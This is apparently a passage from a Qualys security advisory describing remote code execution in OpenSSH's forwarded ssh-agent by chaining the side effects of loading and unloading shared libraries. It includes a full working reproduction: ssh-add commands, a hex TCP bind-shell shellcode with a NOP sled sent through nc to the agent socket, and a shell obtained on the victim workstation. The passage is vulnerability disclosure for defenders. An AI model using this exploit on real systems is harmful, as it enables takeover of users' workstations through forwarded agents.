Results
Discussion
Acknowledgments
Timeline

========================================================================
Summary
========================================================================

    "ssh-agent is a program to hold private keys used for public key
    authentication. Through use of environment variables the agent can
    be located and automatically used for authentication when logging in
    to other machines using ssh(1). ... Connections to ssh-agent may be
    forwarded from further remote hosts using the -A option to ssh(1)
    (but see the caveats documented therein), avoiding the need for
    authentication data to be stored on other machines."
    (<https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fman.openbsd.org%2Fssh-agent.1&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=yjcs4Ynt9Tc6YqjVRROv16ViQw3UbnTsOu4%2FpP6NkMk%3D&reserved=0><<https://man.openbsd.org/ssh-agent.1>>)

    "Agent forwarding should be enabled with caution. Users with the
    ability to bypass file permissions on the remote host ... can access
    the local agent through the forwarded connection. ... A safer
    alternative may be to use a jump host (see -J)."
    (<https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fman.openbsd.org%2Fssh.1&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=U%2FkLvG5xpW91TcVhA%2FQQkXyDu6xkrFPFzxw%2BJH%2BhX%2FI%3D&reserved=0><<https://man.openbsd.org/ssh.1>>)

Despite this warning, ssh-agent forwarding is still widely used today.
Typically, a system administrator (Alice) runs ssh-agent on her local
workstation, connects to a remote server with ssh, and enables ssh-agent
forwarding with the -A or ForwardAgent option, thus making her ssh-agent
(which is running on her local workstation) reachable from the remote
server.

While browsing through ssh-agent's source code, we noticed that a remote
attacker, who has access to the remote server where Alice's ssh-agent is
forwarded to, can load (dlopen()) and immediately unload (dlclose()) any
shared library in /usr/lib* on Alice's workstation (via her forwarded
ssh-agent, if it is compiled with ENABLE_PKCS11, which is the default).

(Note to the curious readers: for security reasons, and as explained in
the "Background" section below, ssh-agent does not actually load such a
shared library in its own address space (where private keys are stored),
but in a separate, dedicated process, ssh-pkcs11-helper.)

Although this seems safe at first (because every shared library in
/usr/lib* comes from an official distribution package, and no operation
besides dlopen() and dlclose() is generally performed by ssh-agent on a
shared library), many shared libraries have unfortunate side effects
when dlopen()ed and dlclose()d, and are therefore unsafe to be loaded
and unloaded in a security-sensitive program such as ssh-agent. For
example, many shared libraries have constructor and destructor functions
that are automatically executed by dlopen() and dlclose(), respectively.

Surprisingly, by chaining four common side effects of shared libraries
from official distribution packages, we were able to transform this very
limited primitive (the dlopen() and dlclose() of shared libraries from
/usr/lib*) into a reliable, one-shot remote code execution in ssh-agent
(despite ASLR, PIE, and NX). Our best proofs of concept so far exploit
default installations of Ubuntu Desktop plus three extra packages from
Ubuntu's "universe" repository. We believe that even better results can
be achieved (i.e., some operating systems might be exploitable in their
default installation):

- we only investigated Ubuntu Desktop 22.04 and 21.10, we have not
  looked into any other versions, distributions, or operating systems;

- the "fuzzer" that we wrote to test our ideas is rudimentary and slow,
  and we ran it intermittently on a single laptop, so we have not tried
  all the combinations of shared libraries and side effects;

- we initially had only one attack vector in mind (i.e., one specific
  combination of side effects from shared libraries), but we discovered
  six more while analyzing the results of our fuzzer, and we are
  convinced that more attack vectors exist.

In this advisory, we present our research, experiments, reproducible
results, and further ideas to exploit this "dlopen() then dlclose()"
primitive. We will also publish the source code of our crude fuzzer at
<https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fwww.qualys.com%2Fresearch%2Fsecurity-advisories%2F&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=%2FMbEJy3RvkLHTGFD6%2F86IiR7qw78xm9XQqA6xOkOoqs%3D&reserved=0><<https://www.qualys.com/research/security-advisories/>> (warning: this code
might hurt the eyes of experienced fuzzing practitioners, but it gave us
quick answers to our many questions; it is provided "as is", in the hope
that it will be useful).

========================================================================
Background
========================================================================

The ability to load and unload shared libraries in ssh-agent was
developed in 2010 to support the addition and deletion of PKCS#11 keys:
ssh-agent forks and executes a long-running ssh-pkcs11-helper process
that dlopen()s PKCS#11 providers (shared libraries), and immediately
dlclose()s them if the symbol C_GetFunctionList cannot be found (i.e.,
if such a shared library is not actually a PKCS#11 provider, which is
the case for the vast majority of the shared libraries in /usr/lib*).

Note: ssh-agent also supports the addition of FIDO keys, by loading a
FIDO authenticator (a shared library) in a short-lived ssh-sk-helper
process; however, unlike ssh-pkcs11-helper, ssh-sk-helper is stateless
(it terminates shortly after loading a single shared library) and can
therefore not be abused by an attacker to chain the side effects of
several shared libraries.

Originally, the path of a shared library to be loaded in
ssh-pkcs11-helper was not filtered at all by ssh-agent, but in 2016 an
allow-list was added ("/usr/lib*/*,/usr/local/lib*/*" by default) in
response to CVE-2016-10009, which was published by Jann Horn (at
<https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fbugs.chromium.org%2Fp%2Fproject-zero%2Fissues%2Fdetail%3Fid%3D1009&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=j6hw2is5FhLWmZ3VfQPPXp%2Bg7VLQlBWEVxYnK%2BSuIyY%3D&reserved=0>):<<https://bugs.chromium.org/p/project-zero/issues/detail?id=1009>>

- if an attacker had access to the server where Alice's ssh-agent is
  forwarded to, and had an unprivileged access to Alice's workstation,
  then this attacker could store a malicious shared library in /tmp on
  Alice's workstation and execute it with Alice's privileges (via her
  forwarded ssh-agent) -- a mild form of Local Privilege Escalation;

- if the attacker had only access to the server where Alice's ssh-agent
  is forwarded to, but could somehow store a malicious shared library
  somewhere on Alice's workstation (without access to her workstation),
  then this attacker could remotely execute this shared library (via
  Alice's forwarded ssh-agent) -- a mild form of Remote Code Execution.

Our first reaction was of course to try to bypass ssh-agent's /usr/lib*
allow-list:

- by finding a logic bug in the filter function, match_pattern_list()
  (but we failed);

- by making a path-traversal attack, for example /usr/lib/../../tmp (but
  we failed, because ssh-agent first calls realpath() to canonicalize
  the path of a shared library, and then calls the filter function);

- by finding a locally or remotely writable file or directory in
  /usr/lib* (but we failed).

Our only option, then, is to abuse side effects of the existing shared
libraries in /usr/lib*; in particular, their constructor and destructor
functions, which are automatically executed by dlopen() and dlclose().
Eventually, we realized that this is essentially a remote version of
CVE-2010-3856, which was published in 2010 by Tavis Ormandy (at
<https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fseclists.org%2Ffulldisclosure%2F2010%2FOct%2F344&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=%2FbjeLJwIbyFiW3Vo2r9Rj%2Fo6LACJqDegnjxx1zN5JOQ%3D&reserved=0>):<<https://seclists.org/fulldisclosure/2010/Oct/344>>

- an unprivileged local attacker could dlopen() any shared library from
  /lib and /usr/lib (via the LD_AUDIT environment variable), even when
  executing a SUID-root program;

- the constructor functions of various common shared libraries created
  files and directories whose location depended on the attacker's
  environment variables and whose creation mode depended on the
  attacker's umask;

- the local attacker could therefore create world-writable files and
  directories anywhere in the filesystem, and obtain full root
  privileges (via crond, for example).

Although the ability to load and unload shared libraries from /usr/lib*
in ssh-agent bears a striking resemblance to CVE-2010-3856, we are in a
much weaker position here, because we are trying to exploit ssh-agent
remotely, so we do not control its environment variables nor its umask
(and we do not even talk directly to ssh-pkcs11-helper, which actually
dlopen()s and dlclose()s the shared libraries: we talk to ssh-agent,
which canonicalizes and filters our requests before passing them on to
ssh-pkcs11-helper).

In fact, we do not control anything except the order in which we load
(and immediately unload) shared libraries from /usr/lib* in ssh-agent.
At that point, we almost abandoned our research, because we could not
possibly imagine how to transform this extremely limited primitive into
a one-shot remote code execution. Nevertheless, we felt curious and
decided to syscall-trace (strace) a dlopen() and dlclose() of every
shared library in the default installation of Ubuntu Desktop. We
instantly observed four surprising behaviors:

------------------------------------------------------------------------

1/ Some shared libraries require an executable stack, either explicitly
because of an RWE (readable, writable, executable) GNU_STACK ELF header,
or implicitly because of a missing GNU_STACK ELF header (in which case
the loader defaults to an executable stack): when such an "execstack"
library is dlopen()ed, the loader makes the main stack and all thread
stacks executable, and they remain executable even after dlclose().

For example, /usr/lib/systemd/boot/efi/linuxx64.elf.stub in the default
installation of Ubuntu Desktop 22.04.

------------------------------------------------------------------------

2/ Many shared libraries are marked as "nodelete" by the loader, either
explicitly because of a NODELETE ELF flag, or implicitly because they
are in the dependency list of a NODELETE library: the loader will never
unload (munmap()) such libraries, even after they are dlclose()d.

For example, /usr/lib/x86_64-linux-gnu/librt.so.1 in the default
installation of Ubuntu Desktop 22.04 and 21.10.

------------------------------------------------------------------------

3/ Some shared libraries register a signal handler for SIGSEGV when they
are dlopen()ed, but they do not deregister this signal handler when they
are dlclose()d (i.e., this signal handler is still registered when its
code is munmap()ed).

For example, /usr/lib/x86_64-linux-gnu/libSegFault.so in the default
installation of Ubuntu Desktop 21.10.

------------------------------------------------------------------------

4/ Some shared libraries crash with a SIGSEGV as soon as they are
dlopen()ed (usually because of a NULL-pointer dereference), because they
are supposed to be loaded in a specific context, not in a random program
such as ssh-agent.

For example, most of the /usr/lib/x86_64-linux-gnu/xtables/lib*.so in
the default installation of Ubuntu Desktop 22.04 and 21.10.

------------------------------------------------------------------------

And so an exciting idea to remotely exploit ssh-agent came into our
mind:

a/ make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack) by dlopen()ing one of the "execstack"
libraries ("surprising behavior 1/"), and somehow store a 1990-style
shellcode somewhere in this executable stack;

b/ register a signal handler for SIGSEGV and immediately munmap() its
code, by dlopen()ing and dlclose()ing one of the shared libraries from
"surprising behavior 3/" (consequently, a dangling pointer to this
unmapped signal handler is retained in the kernel);

c/ replace the unmapped signal handler's code with another piece of code
from another shared library, by dlopen()ing (mmap()ing) one of the
"nodelete" libraries ("surprising behavior 2/");

d/ raise a SIGSEGV by dlopen()ing one of the shared libraries from
"surprising behavior 4/", so that the unmapped signal handler is called
by the kernel, but the replacement code from the "nodelete" library is
executed instead (a use-after-free of sorts);

e/ hope that this replacement code (which is mapped where the signal
handler was mapped) is a useful gadget that somehow jumps into the
executable stack, exactly where our shellcode is stored.

========================================================================
Experiments
========================================================================

But "hope is not a strategy", so we decided to implement the following
6-step plan to test our remote-exploitation idea in ssh-agent:

------------------------------------------------------------------------

Step 1 - We install a default Ubuntu Desktop, download all official
packages from Ubuntu's "main" and "universe" repositories, and extract
all /usr/lib* files from these packages. These files occupy ~200GB of
disk space and include ~60,000 shared libraries.

Note: after the default installation of Ubuntu Desktop, but before the
extraction of all /usr/lib* files, we "chattr +i /etc/ld.so.cache" to
make sure that this file does not grow unrealistically (from kilobytes
to megabytes); indeed, it is mmap()ed by the loader every time dlopen()
is called, and a large file might therefore destroy the mmap layout and
prevent our fuzzer's results from being reproducible in the real world.

------------------------------------------------------------------------

Step 2 - For each shared library in /usr/lib*, we fork and execute
ssh-pkcs11-helper, strace it, and request it to dlopen() (and hence
immediately dlclose()) this shared library; if we spot anything unusual
in the strace logs (a raised signal, a clone() call, etc) or outstanding
differences in /proc/pid/maps or /proc/pid/status between before and
after dlopen() and dlclose(), then we mark this shared library as
interesting.

------------------------------------------------------------------------

Step 3 - We analyze the results of Step 2. For example, on Ubuntu
Desktop 22.04:

- 58 shared libraries make the stack executable when dlopen()ed (and the
  stack remains executable even after dlclose());

- 16577 shared libraries permanently alter the mmap layout when
  dlopen()ed (either because they are "nodelete" libraries, or because
  they allocate a thread stack or otherwise leak mmap()ed memory);

- 9 shared libraries register a SIGSEGV handler when dlopen()ed (but do
  not deregister it when dlclose()d), and 238 shared libraries raise a
  SIGSEGV when dlopen()ed;

- 2 shared libraries register a SIGABRT handler when dlopen()ed, and 44
  shared libraries raise a SIGABRT when dlopen()ed.

On Ubuntu Desktop 21.10:

- 30 shared libraries make the stack executable;

- 16172 shared libraries permanently alter the mmap layout;

- 9 shared libraries register a SIGSEGV handler, and 147 shared
  libraries raise a SIGSEGV;

- 2 shared libraries register a SIGABRT handler, and 38 shared libraries
  raise a SIGABRT;

- 1 shared library registers a SIGBUS handler, and 11 shared libraries
  raise a SIGBUS;

- 1 shared library registers a SIGCHLD handler, and 61 shared libraries
  raise a SIGCHLD;

- 1 shared library registers a SIGILL handler, and 1 shared library
  raises a SIGILL.

------------------------------------------------------------------------

Step 4 - We implement a rudimentary fuzzing strategy, by forking and
executing ssh-pkcs11-helper in a loop, and by loading (and unloading)
random combinations of the interesting shared libraries from Step 3:

a/ we randomly load zero or more shared libraries that permanently alter
the mmap layout, in the hope of creating holes in the mmap layout, thus
potentially shifting the replacement code (which will later replace the
signal handler's code) with page precision;

b/ we randomly load one shared library that registers a signal handler
but does not deregister it when dlclose()d (i.e., when munmap()ed);

c/ we randomly load zero or more shared libraries that alter the mmap
layout (again), thus replacing the unmapped signal handler's code with
another piece of code (a hopefully useful gadget) from another shared
library (a "nodelete" library);

d/ we randomly load one shared library that raises the signal that is
caught by the unmapped signal handler: the replacement code (gadget) is
executed instead, and if it jumps into the stack (a SEGV_ACCERR with a
RIP register that points to the stack, because we did not make the stack
executable in this Step 4), then we mark this particular combination of
shared libraries as interesting.

Surprise: we actually get numerous jumps to the stack in this Step 4,
usually because the signal handler's code is replaced by a "jmp REG",
"call REG", or "pop; pop; ret" gadget, and the "REG" or popped RIP
register happens to point to the stack at the time of the jump.

------------------------------------------------------------------------

Step 5 - We implement this extra step to test whether the interesting
combinations of shared libraries from Step 4 actually jump into our
shellcode in the stack, or into uncontrolled data in the stack:

a/ we make the stack executable, by randomly loading one of the
"execstack" libraries from Step 3;

b/ we store ~10KB of 0xcc bytes in the stack buffer "buf" of
ssh-pkcs11-helper's main() function: 10KB is the maximum message length
that we can send to ssh-pkcs11-helper (via ssh-agent), and on amd64 0xcc
is the "int3" instruction that generates a SIGTRAP when executed;

c/ we randomly replay one of the interesting combinations of shared
libraries from Step 4: if a SIGTRAP is generated while the RIP register
points to the stack, then there is a fair chance that ssh-pkcs11-helper
jumped into our shellcode (our 0xcc bytes) in the executable stack.

Surprise: we actually get many SIGTRAPs in the stack during this Step 5,
but to our great dismay, most of these SIGTRAPs are generated because
ssh-pkcs11-helper jumps into the stack, in the middle of a pointer that
is stored on the stack and that happens to contain a 0xcc byte because
of ASLR (i.e., not because ssh-pkcs11-helper jumps into our own 0xcc
bytes in the stack).

------------------------------------------------------------------------

Step 6 - We implement this extra step to eliminate the false positives
produced by Step 5:

a/ we repeatedly replay (N times) each combination of shared libraries
that generates a SIGTRAP in the stack: if N SIGTRAPs are generated out
of N replays, then there is an excellent chance that ssh-pkcs11-helper
does indeed jump into our shellcode (our 0xcc bytes) in the stack (and
not into random bytes that happen to be 0xcc because of ASLR);

b/ if this is confirmed by a manual check (with gdb for example), then
we achieved a reliable, one-shot remote code execution in ssh-agent,
despite the very limited primitive, and despite ASLR, PIE, and NX.

========================================================================
Results
========================================================================

In this section, we present the results of our experiments:

- Signal handler use-after-free (Ubuntu Desktop 22.04)
- Signal handler use-after-free (Ubuntu Desktop 21.10)
- Callback function use-after-free
- Return from syscall use-after-free
- Sigaltstack use-after-free
- Sigreturn to arbitrary instruction pointer
- _Unwind_Context type-confusion
- RCE in library constructor

========================================================================
Signal handler use-after-free (Ubuntu Desktop 22.04)
========================================================================

This was our original idea for remotely attacking ssh-agent, as
discussed at the end of the "Background" section and as implemented in
the "Experiments" section. In this subsection, we present one of the
various combinations of shared libraries that result in a reliable,
one-shot remote code execution in ssh-agent on Ubuntu Desktop 22.04.

------------------------------------------------------------------------

1a/ On our local workstation, we install a default Ubuntu Desktop 22.04
(<https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fold-releases.ubuntu.com%2Freleases%2F22.04%2Fubuntu-22.04-desktop-amd64.iso&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=Asi2VKNB1zU3PO0i%2B2M%2BotE7IgNbsWyWVKhL2XmAVeY%3D&reserved=0><<https://old-releases.ubuntu.com/releases/22.04/ubuntu-22.04-desktop-amd64.iso>>),
without connecting this workstation to the Internet.

------------------------------------------------------------------------

1b/ After the installation is complete, we modify /etc/apt/sources.list
to prevent any package from being upgraded to a version that is not the
one that we used in our experiments:

workstation# cp -i /etc/apt/sources.list /etc/apt/sources.list.backup
workstation# grep ' jammy ' /etc/apt/sources.list.backup > /etc/apt/sources.list

------------------------------------------------------------------------

1c/ We connect our workstation to the Internet, and install the three
packages (from Ubuntu's official "universe" repository) that contain the
three shared libraries used in this particular attack against ssh-agent:

workstation# apt-get update
workstation# apt-get upgrade
workstation# apt-get --no-install-recommends install eclipse-titan
workstation# apt-get --no-install-recommends install libkf5sonnetui5
workstation# apt-get --no-install-recommends install libns3-3v5

------------------------------------------------------------------------

2/ As Alice, we run ssh-agent on our local workstation, connect to a
remote server with ssh, and enable ssh-agent forwarding with -A:

workstation$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare)

workstation$ eval `ssh-agent -s`
Agent pid 1105

workstation$ echo /tmp/ssh-*/agent.*
/tmp/ssh-XXXXXXmgHTo9/agent.1104

workstation$ ssh -A server

server$ id
uid=1001(alice) gid=1001(alice) groups=1001(alice)

server$ echo /tmp/ssh-*/agent.*
/tmp/ssh-N5EjHljGRh/agent.1299

------------------------------------------------------------------------

3/ Then, as a remote attacker who has access to this server:

------------------------------------------------------------------------

3a/ we remotely make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack), via Alice's ssh-agent forwarding (indeed,
the ssh-agent itself is running on Alice's workstation, not on the
server):

server# echo /tmp/ssh-*/agent.*
/tmp/ssh-N5EjHljGRh/agent.1299

server# export SSH_AUTH_SOCK=/tmp/ssh-N5EjHljGRh/agent.1299

server# ssh-add -s /usr/lib/systemd/boot/efi/linuxx64.elf.stub
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/systemd/boot/efi/linuxx64.elf.stub": agent refused operation

------------------------------------------------------------------------

3b/ we remotely store a shellcode in the stack buffer "buf" of
ssh-pkcs11-helper's main() function:

server# SHELLCODE=$'\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05'

server# (perl -e 'print "\0\0\x27\xbf\x14\0\0\0\x10/usr/lib/modules\0\0\x27\xa6" . "\x90" x 10000'; echo -n "$SHELLCODE") | nc -U "$SSH_AUTH_SOCK"
[Press Ctrl-C after a few seconds.]

- we do not use ssh-add here, because we want to send a ~10KB passphrase
  (our shellcode) to ssh-agent, but ssh-add limits the length of our
  passphrase to 1KB;

- "\x90" x 10000 is a ~10KB "NOP sled" (on amd64, 0x90 is the "nop"
  instruction);

- SHELLCODE is a "TCP bind shell" on port 31337 (from
  <https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fshell-storm.org%2Fshellcode%2Ffiles%2Fshellcode-858.html&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=Kk1ZEIG3Eu6RBz4ODQ2Ojr%2Ba3H%2F5d1RpGm7TcCJzaUU%3D&reserved=0>)<<https://shell-storm.org/shellcode/files/shellcode-858.html>>;

- /usr/lib/modules is an existing directory whose path matches
  ssh-agent's /usr/lib* allow-list (indeed, we do not want to actually
  load a shared library here -- we just want to store our shellcode in
  the executable stack);

------------------------------------------------------------------------

3c/ we remotely register a SIGSEGV handler, and immediately munmap() its
code:

server# ssh-add -s /usr/lib/titan/libttcn3-rt2-dynamic.so
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/titan/libttcn3-rt2-dynamic.so": agent refused operation

------------------------------------------------------------------------

3d/ we remotely replace the unmapped SIGSEGV handler's code with another
piece of code (a useful gadget) from another shared library:

server# ssh-add -s /usr/lib/x86_64-linux-gnu/libKF5SonnetUi.so.5.92.0
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/x86_64-linux-gnu/libKF5SonnetUi.so.5.92.0": agent refused operation

------------------------------------------------------------------------

3e/ we remotely raise a SIGSEGV in ssh-pkcs11-helper:

server# ssh-add -s /usr/lib/x86_64-linux-gnu/libns3.35-wave.so.0.0.0
Enter passphrase for PKCS#11: whatever
[Press Ctrl-C after a few seconds.]

------------------------------------------------------------------------

3f/ the replacement code (gadget) is executed (instead of the unmapped
SIGSEGV handler's code) and jumps to the stack, into our shellcode,
which binds a shell on TCP port 31337 on Alice's workstation:

server# nc -v workstation 31337
Connection to workstation 31337 port [tcp/*] succeeded!

workstation$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare)

workstation$ ps axuf
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...
alice       1105  0.0  0.1   7968  4192 ?        Ss   09:48   0:00 ssh-agent -s
alice       1249  0.0  0.0   2888   956 ?        S    10:03   0:00  \_ [sh]
alice       1268  0.0  0.0   7204  3092 ?        R    10:14   0:00      \_ ps axuf

------------------------------------------------------------------------

To get a clear view of the replacement code (the useful gadget) that is
executed instead of the unmapped SIGSEGV handler and that jumps into the
NOP sled of our shellcode (in the executable stack), we relaunch our
attack against ssh-agent and attach to ssh-pkcs11-helper with gdb:

workstation$ gdb /usr/lib/openssh/ssh-pkcs11-helper 1307
...
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007fb15c9b560e in std::_Rb_tree_decrement(std::_Rb_tree_node_base*) () from /lib/x86_64-linux-gnu/libstdc++.so.6

(gdb) stepi
0x00007fb15d0e1250 in ?? () from /lib/x86_64-linux-gnu/libQt5Widgets.so.5

(gdb) x/10i 0x00007fb15d0e1250
=> 0x7fb15d0e1250:      add    %rcx,%rdx
   0x7fb15d0e1253:      notrack jmp *%rdx
   ...

(gdb) stepi
0x00007fb15d0e1253 in ?? () from /lib/x86_64-linux-gnu/libQt5Widgets.so.5

(gdb) stepi
0x00007ffc2ec82691 in ?? ()

(gdb) x/10i 0x00007ffc2ec82691
=> 0x7ffc2ec82691:      nop
   0x7ffc2ec82692:      nop
   0x7ffc2ec82693:      nop
   0x7ffc2ec82694:      nop
   0x7ffc2ec82695:      nop
   0x7ffc2ec82696:      nop
   0x7ffc2ec82697:      nop
   0x7ffc2ec82698:      nop
   0x7ffc2ec82699:      nop
   0x7ffc2ec8269a:      nop

(gdb) !grep stack /proc/1307/maps
7ffc2ec66000-7ffc2ec87000 rwxp 00000000 00:00 0                          [stack]

========================================================================
Signal handler use-after-free (Ubuntu Desktop 21.10)
========================================================================

In this subsection, we present one of the various combinations of shared
libraries that result in a reliable, one-shot remote code execution in
ssh-agent on Ubuntu Desktop 21.10.

------------------------------------------------------------------------

1a/ On our local workstation, we install a default Ubuntu Desktop 21.10
(<https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fold-releases.ubuntu.com%2Freleases%2F21.10%2Fubuntu-21.10-desktop-amd64.iso&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=s6Y9CILGTxKnr0Ox53dA8v%2F2OblH63SBJOKvTb91jsE%3D&reserved=0><<https://old-releases.ubuntu.com/releases/21.10/ubuntu-21.10-desktop-amd64.iso>>),
without connecting this workstation to the Internet.

------------------------------------------------------------------------

1b/ After the installation is complete, we modify /etc/apt/sources.list
to prevent any package from being upgraded to a version that is not the
one that we used in our experiments:

workstation# cp -i /etc/apt/sources.list /etc/apt/sources.list.backup
workstation# echo 'deb <https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fold-releases.ubuntu.com%2Fubuntu%2F&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=M9UUStPZtnN1Zm6vzhcYoELovmTTib8juOO796aOFXE%3D&reserved=0><<https://old-releases.ubuntu.com/ubuntu/>> impish main restricted universe' > /etc/apt/sources.list

------------------------------------------------------------------------

1c/ We connect our workstation to the Internet, and install the three
packages (from Ubuntu's official "universe" repository) that contain the
three extra shared libraries used in this attack against ssh-agent:

workstation# apt-get update
workstation# apt-get upgrade
workstation# apt-get --no-install-recommends install syslinux-common
workstation# apt-get --no-install-recommends install libgnatcoll-postgres1
workstation# apt-get --no-install-recommends install libenca-dbg

------------------------------------------------------------------------

2/ As Alice, we run ssh-agent on our local workstation, connect to a
remote server with ssh, and enable ssh-agent forwarding with -A:

workstation$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),133(lxd),134(sambashare)

workstation$ eval `ssh-agent -s`
Agent pid 912

workstation$ echo /tmp/ssh-*/agent.*
/tmp/ssh-GnpGKph6xbe3/agent.911

workstation$ ssh -A server

server$ id
uid=1001(alice) gid=1001(alice) groups=1001(alice)

server$ echo /tmp/ssh-*/agent.*
/tmp/ssh-30N8pjTKWn/agent.996

------------------------------------------------------------------------

3/ Then, as a remote attacker who has access to this server:

------------------------------------------------------------------------

3a/ we remotely make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack), via Alice's ssh-agent forwarding:

server# echo /tmp/ssh-*/agent.*
/tmp/ssh-30N8pjTKWn/agent.996

server# export SSH_AUTH_SOCK=/tmp/ssh-30N8pjTKWn/agent.996

server# ssh-add -s /usr/lib/syslinux/modules/efi64/gfxboot.c32
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/syslinux/modules/efi64/gfxboot.c32": agent refused operation

------------------------------------------------------------------------

3b/ we remotely store a shellcode in the stack of ssh-pkcs11-helper:

